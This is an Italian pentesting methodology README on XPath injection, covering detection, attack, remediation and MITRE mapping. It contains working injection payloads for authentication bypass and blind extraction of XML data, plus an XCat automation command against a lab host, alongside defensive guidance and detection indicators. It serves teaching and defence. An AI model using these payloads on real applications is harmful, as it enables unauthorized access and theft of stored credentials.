> [English](README.en.md) | **Italiano**

# XPath injection

> - **Fase:** Web Exploitation - OWASP A03:2021 Injection (query XPath costruita con input non sanitizzato)
> - **Visibilita:** Media - query anomale verso il parser XML/XPath; l'estrazione blind genera molte richieste con differenze comportamentali
> - **Prerequisiti:** un'applicazione che interroga un documento XML con XPath costruendo la query a partire da input dell'utente (login o lookup con backend XML)
> - **Natura del documento:** metodologia. Payload illustrativi (forma didattica OWASP), nessun Finding ID fabbricato (prossimo `WEB-016`, da assegnare in lab).

- Obiettivo: manipolare una query XPath per bypassare l'autenticazione ed estrarre l'intero contenuto del documento XML sottostante, sfruttando l'assenza di controllo d'accesso tipica di XPath.

---

## Executive summary

La XPath Injection e la cugina della SQL Injection per le applicazioni che usano **documenti XML** come
sorgente dati e **XPath** come linguaggio di interrogazione. Quando un'app costruisce un'espressione XPath
concatenando l'input dell'utente (classicamente in un form di login che cerca l'utente in un file XML), un
attaccante puo iniettare la sintassi XPath e alterare la logica della query.

Rispetto a SQLi e LDAP Injection, la XPath ha una caratteristica che la rende particolarmente insidiosa:
**XPath non ha un modello di controllo d'accesso**. In un database esistono permessi per tabella/colonna; in un
documento XML interrogato via XPath, una volta ottenuta l'iniezione si puo leggere **l'intero documento**, non
solo il nodo previsto. Gli impatti principali sono bypass dell'autenticazione ed estrazione completa dei dati
dell'XML (spesso credenziali e profili utente). La severity tipica e `Alto`.

## Contesto operativo (perche, prima del come)

La XPath Injection si incontra dove l'applicazione usa XML come "piccolo database": autenticazione, liste
utenti, configurazioni. Il test iniziale e analogo alla SQLi: si inietta un metacarattere XPath (apice,
parentesi) e si osserva se la query si rompe o cambia comportamento. La decisione successiva e tra bypass
diretto (se la query autentica), estrazione in chiaro (se riflette) o estrazione blind (differenze
comportamentali vero/falso), come nella [SQLi blind](<../sql-injection (SQLi)/README.md>).

## Esecuzione / comandi

### Fase 1 - conferma della vulnerabilita

Una query XPath di autenticazione tipica ha questa forma:

```
//user[username/text()='NOME' and password/text()='PASS']
```

Si inietta un apice nel nome utente e si verifica se la query si rompe (errore XPath) o cambia comportamento:
segnale che l'input raggiunge l'espressione senza escape.

### Fase 2 - bypass dell'autenticazione (concettuale)

Come nella SQLi, si introduce una condizione sempre vera (tautologia) che rende irrilevante la password. Payload
nel campo username:

```
' or '1'='1              <-- tautologia classica
admin' or '1'='1         <-- forza l'utente 'admin'
') or ('1'='1            <-- quando l'input e racchiuso tra parentesi
' or position()=1 or '   <-- seleziona il primo nodo utente
```

### Fase 3 - estrazione blind dell'intero documento

In assenza di controllo d'accesso XPath, si naviga l'intero XML un carattere alla volta con `substring()`,
`string-length()`, `count()`, `name()` e le differenze comportamentali vero/falso:

```
# Quanti nodi utente esistono
' or count(/users/user)=5 or '                        -> TRUE se ci sono 5 utenti
# Lunghezza della password del primo utente
' or string-length(/users/user[1]/password)=12 or '   -> TRUE se lunga 12
# Estrazione carattere per carattere
' or substring(/users/user[1]/password,1,1)='P' or '   -> TRUE: 1o char = 'P'
' or substring(/users/user[1]/password,2,1)='a' or '   -> TRUE: 2o char = 'a'
# Scoperta della struttura (nome di nodi/attributi)
' or name(/users/user[1]/*[1])='username' or '
```

Automazione con `XCat` (dump completo del documento via blind XPath):

```bash
xcat --method GET run "http://target.lab/login" username --true-string "Welcome" \
  -- "/users/user[position()=1]"
```

## Analisi dei risultati

Il bypass dell'autenticazione consente l'accesso come utente arbitrario; l'estrazione blind puo esfiltrare
l'intero documento XML, inclusi username e password se memorizzati li. La severity reale e `Alto` (bypass +
lettura completa dei dati); sale verso `Critico` se l'XML contiene credenziali riutilizzabili verso sistemi piu
importanti. Se l'applicazione usa XPath precompilato con binding di variabili (o fa escape corretto), il vettore
e chiuso.

### Analisi teorica

La XPath Injection e un altro caso del problema dati/istruzioni [Su & Wassermann 2006]. La peculiarita teorica
e l'assenza di un modello di autorizzazione nel linguaggio: XPath e pensato per navigare liberamente un
documento, quindi non esiste il concetto di "nodo a cui l'utente non ha accesso". Questo amplifica l'impatto
dell'injection rispetto alla SQLi, dove i privilegi di database possono limitare i danni. La contromisura e
strutturale: non costruire l'espressione per concatenazione ma usare XPath parametrizzato (variabili legate,
`XPathExpression` precompilata con `XPathVariableResolver` in Java, `lxml` con variabili in Python), piu la
validazione dell'input.

## Remediation (blue team)

**Rilevamento (WAF/SIEM).**
- Input contenenti metacaratteri XPath (apici, `[`, `]`, `or`, `and`, funzioni come `substring`) nei parametri.
- Errori del parser XPath nei log applicativi.
- Volume anomalo di richieste con piccole variazioni (indice di estrazione blind).

**Hardening (secure coding).**
- Usare XPath parametrizzato con binding di variabili, mai concatenazione di stringhe (contromisura primaria).
- Validare e limitare l'input (whitelist dei caratteri ammessi).
- Fare escape dei metacaratteri XPath quando la parametrizzazione non e disponibile.
- Valutare se l'XML sia il backend adatto: dati di autenticazione stanno meglio in uno store con controllo
  d'accesso.

---

## Scenario reale: proiezione Post-Exploitation

> Vale per l'esito "bypass auth / estrazione completa XML" (severity Alto/Critico).

### Prospettiva attaccante (red team)

**Punto di partenza:** applicazione con autenticazione o lookup basati su XML/XPath e input non sanitizzato.

**Passo successivo immediato:** bypass dell'autenticazione, poi estrazione blind dell'intero documento XML.

**Kill Chain proiettata:**

```
XPath Injection su login/lookup con backend XML
        |
        v
Bypass autenticazione (tautologia) + estrazione dell'intero documento
        |
        v
Credenziali e profili utente esfiltrati dall'XML
        |
        v
Riuso delle credenziali verso altri sistemi / accesso ai dati sensibili
```

**Impatto potenziale:** accesso non autorizzato ed esfiltrazione completa del data store XML; escalation per
riuso credenziali quando l'XML conserva password.

**Vettori di monetizzazione tipici:** furto e rivendita dei dati; accesso ad aree riservate; riuso credenziali.

### Prospettiva difensore (blue team)

**Rilevamento:** metacaratteri XPath nei parametri; errori del parser; pattern di estrazione blind.

**Indicatori di Compromissione (IOC):**
- Parametri con apici, operatori logici XPath o funzioni `substring`/`string-length` non previste.
- Sequenze di richieste quasi identiche con risposte differenziali.

**Contenimento:** blocco del pattern via WAF; rotazione delle credenziali eventualmente esposte nell'XML.

**Eradicazione e hardening:** XPath parametrizzato; validazione input; rivalutazione dello store per i dati di
autenticazione.

**Lezione difensiva:** la XPath Injection ricorda che ogni linguaggio di query concatenato con input utente e
vulnerabile all'injection, e che l'assenza di controllo d'accesso in XPath rende l'estrazione totale: la difesa
e separare dati e codice (parametrizzazione) a prescindere dal motore.

---

## Tool di riferimento

| tool | tipo | tecnica/accesso | caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `Burp Suite` | proxy/scanner | web - attivo | intercetta e modifica i parametri; fuzzing dei metacaratteri xpath |
| `XCat` | exploit tool | cli - attivo | automazione dell'estrazione blind di un documento xml via xpath injection |
| `lxml` (python) | libreria xml | secure coding | xpath parametrizzato con variabili per la remediation (blue team) |

## Note di metodologia

In lab reale (es. un'app con login su file XML o un target didattico) i dati da documentare come finding: la
conferma della vulnerabilita, l'esito del bypass e la porzione di documento estratta. Le credenziali reali
eventualmente estratte vanno trattate come dati sensibili e redatte. I payload mostrati sono nella forma
didattica minima.

## Mappatura MITRE ATT&CK

| tattica | tecnica | id mitre | descrizione dell'azione |
| :--- | :--- | :--- | :--- |
| initial access | exploit public-facing application | `T1190` | sfruttamento dell'espressione xpath non sanitizzata su un'applicazione esposta. |
| collection | data from information repositories | `T1213` | estrazione dell'intero documento xml (profili, credenziali) via xpath injection. |

---

## Correlazioni con altri finding

| provenienza | questa tecnica | effetto |
| :--- | :--- | :--- |
| [02-web-recon](<../../02-web-recon (Enumeration)/README.md>) | xpath injection | l'enumerazione individua le funzionalita con backend xml |
| [sql injection](<../sql-injection (SQLi)/README.md>) | xpath injection | stessa classe (injection), diverso motore di query; xpath senza controllo d'accesso |
| xpath injection | [secure-coding-lab](<../../06-secure-coding-lab (Defense)/README.md>) | la remediation (xpath parametrizzato) si collega al laboratorio di secure coding |

---

> **Nota:** Contenuto didattico e di metodologia. Le tecniche vanno eseguite esclusivamente su applicazioni di proprieta o con autorizzazione esplicita. I payload sono illustrativi e non provengono da sistemi reali o di terze parti.
